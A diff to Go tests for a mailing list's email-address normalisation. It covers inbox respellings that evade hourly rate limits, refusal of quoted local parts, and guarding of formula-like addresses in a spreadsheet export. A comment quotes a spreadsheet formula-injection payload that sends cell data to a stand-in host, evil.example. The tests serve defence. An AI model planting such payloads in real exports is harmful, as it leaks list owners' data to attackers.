@@ -134,27 +134,33 @@ func TestOneInboxIsMailedOnceAnHourHoweverItIsSpelled(t *testing.T) {
 }
 
 // What a mail relay reads past before it delivers is read past here too: a
-// final dot on the domain, quoting and comments. Each of these spellings
-// was an inbox of its own, with an hour of its own, and the relay delivers
-// every one to victim@gmail.com: the dot alone gave Gmail's dots back,
-// one spelling a link for every place a dot can go.
+// final dot on the domain and comments. Each of these spellings was an
+// inbox of its own, with an hour of its own, and the relay delivers every
+// one to victim@gmail.com: the dot alone gave Gmail's dots back, one
+// spelling a link for every place a dot can go. A quoted local part is not
+// an address at all now, by the rule a form, a booking and a record's email
+// field share, so it is refused before it can be a spelling of anything.
 func TestAnInboxIsNotRespelledByWhatTheRelayReadsPast(t *testing.T) {
 	l := openList(t)
 	if _, out, err := l.SignUp(Subscriber{Email: "victim@gmail.com"}, t0); err != nil || out != Mail {
 		t.Fatalf("the first sign-up: %v %v", out, err)
 	}
 	for i, spelling := range []string{"v.ictim@gmail.com.", "vi.ctim+1@GMAIL.COM.", "vic.tim@googlemail.com..",
-		`"victim"@gmail.com`, `"v.ictim+2"@gmail.com`, `"vic\tim"@gmail.com`,
 		"victim(1)@gmail.com", "victim@gmail.com(2)", "victim@(3)gmail.com", "vic((4))tim@gmail.com"} {
 		if _, out, err := l.SignUp(Subscriber{Email: spelling}, t0.Add(time.Duration(i+1)*time.Minute)); err != nil || out != Quiet {
 			t.Errorf("%s, within the hour of a link to the same inbox: %v %v", spelling, out, err)
+		}
+	}
+	for _, quoted := range []string{`"victim"@gmail.com`, `"v.ictim+2"@gmail.com`, `"vic\tim"@gmail.com`, `"ann"@example.com`} {
+		if _, out, err := l.SignUp(Subscriber{Email: quoted}, t0.Add(15*time.Minute)); !errors.Is(err, ErrAddress) || out == Mail {
+			t.Errorf("%s was taken as an address: %v %v", quoted, out, err)
 		}
 	}
 	// Kept as typed, and other inboxes are still their own.
 	if s, err := l.Get(l.ID("v.ictim@gmail.com.")); err != nil || s.Email != "v.ictim@gmail.com." {
 		t.Fatalf("the address as typed: %+v %v", s, err)
 	}
-	for _, other := range []string{"victim2@gmail.com.", `"ann"@example.com`, "a.nn@example.com."} {
+	for _, other := range []string{"victim2@gmail.com.", "ann@example.com", "a.nn@example.com."} {
 		if _, out, _ := l.SignUp(Subscriber{Email: other}, t0.Add(20*time.Minute)); out != Mail {
 			t.Errorf("%s was not mailed: another inbox's hour held it", other)
 		}
@@ -560,14 +566,15 @@ func TestAnImportHonoursWhoLeftWhereverTheyLeft(t *testing.T) {
 // off again.
 //
 // Only the name and the consent were guarded. An address is the visitor's
-// to type, and =HYPERLINK("http://evil.example/?"&B2)@x.example passes the
+// to type, and =HYPERLINK("http://evil.example/?"&B2)@x.example passed the
 // address check, so once confirmed it went out as a formula in the very
 // file a site's owner opens in a spreadsheet to look at their list. And
 // the names the export did guard came back from an import with the
-// apostrophe still on.
+// apostrophe still on. The one address rule refuses the quotes in that
+// one now; a formula without them is still an address.
 func TestAnAddressThatLooksLikeAFormulaIsGuardedInTheSubscriberExport(t *testing.T) {
 	t0 := time.Date(2026, 11, 4, 9, 0, 0, 0, time.UTC)
-	evil := `=hyperlink("http://evil.example/?"&b2)@x.example`
+	evil := `=hyperlink(b2&c2)@x.example`
 	if _, err := Normalize(evil); err != nil {
 		t.Fatalf("control: the address check refuses %q, so it cannot be on a list: %v", evil, err)
 	}
